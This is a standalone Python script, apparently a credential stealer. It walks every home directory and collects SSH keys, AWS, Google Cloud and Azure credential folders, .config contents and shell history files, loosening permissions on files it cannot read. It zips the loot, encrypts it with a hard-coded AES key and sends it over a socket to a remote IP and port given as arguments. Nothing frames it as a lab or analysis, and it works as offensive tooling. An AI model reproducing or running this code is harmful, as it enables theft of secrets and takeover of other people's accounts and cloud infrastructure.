import os
import re
import zipfile
import io
import socket 
from cryptography.hazmat.primitives.ciphers.aead import AESGCM
import sys
import struct 

if len(sys.argv)!=3:
    print(f'Usage: {sys.argv[0]} <ip> <port>')
    sys.exit(1)


ip = sys.argv[1]
port = int(sys.argv[2])

PATTERN = re.compile(r"^\..+_history$")
KEY = b"0123456789ABCDEF0123456789ABCDEF"
SEARCH_ROOT = "/home"

TARGET_NAMES = {
    ".config",
    ".ssh",
    ".aws",
    ".gcloud",
    ".azure",
}

OUTPUT_ZIP = "test_archive.zip"


def fix_permission(path):
    try:
        os.chmod(path, 0o755)
        return True
    except Exception:
        #print(f"[!] Could not chmod: {path}")
        return False


memory_zip = io.BytesIO()

with zipfile.ZipFile(
    memory_zip,
    mode="w",
    compression=zipfile.ZIP_DEFLATED
) as zf:

    for root, dirs, files in os.walk(SEARCH_ROOT):

        #
        # MATCH DIRECTORIES
        #
        for dirname in dirs:

            if dirname in TARGET_NAMES or PATTERN.match(dirname):

                full_path = os.path.join(root, dirname)

                #print(f"[DIR ] {full_path}")

                try:

                    for subroot, _, subfiles in os.walk(full_path):

                        for f in subfiles:

                            fp = os.path.join(subroot, f)

                            try:
                                arcname = os.path.relpath(
                                    fp,
                                    SEARCH_ROOT
                                )

                                zf.write(fp, arcname)

                                #print(f"  [+] {arcname}")

                            except PermissionError:
                                #print(f"  [DENIED] {fp}")

                                try:
                                    fix_permission(fp)
                                    zf.write(fp, arcname)
                                except Exception:
                                    pass

                            except Exception as e:
                                pass
                                #print(f"  [ERROR] {fp}: {e}")

                except Exception as e:
                    #print(f"[ERROR] {full_path}: {e}")
                    pass

        #
        # MATCH FILES
        #
        for filename in files:

            if filename in TARGET_NAMES or PATTERN.match(filename):

                fp = os.path.join(root, filename)

                #print(f"[FILE] {fp}")

                try:
                    arcname = os.path.relpath(
                        fp,
                        SEARCH_ROOT
                    )

                    zf.write(fp, arcname)

                except PermissionError:
                    #print(f"  [DENIED] {fp}")
                    pass 

                except Exception as e:
                    pass
                    #print(f"  [ERROR] {fp}: {e}")


#
# WRITE ZIP TO DISK
#
memory_zip.seek(0)

zip_bytes = memory_zip.getvalue()

# encryption

nonce = os.urandom(12)

aesgcm = AESGCM(KEY)

ciphertext = aesgcm.encrypt(
    nonce,zip_bytes,None
)

encrypted_blob = nonce+ciphertext 

with open(OUTPUT_ZIP, "wb") as f:
    f.write(encrypted_blob)

#print(f"\n[+] ZIP WRITTEN: {OUTPUT_ZIP}")


with socket.create_connection((ip,port)) as s:
    s.sendall(struct.pack("!Q",len(encrypted_blob)))

    s.sendall(encrypted_blob)

    #print(f'[+] sent {len(encrypted_blob)} bytes')


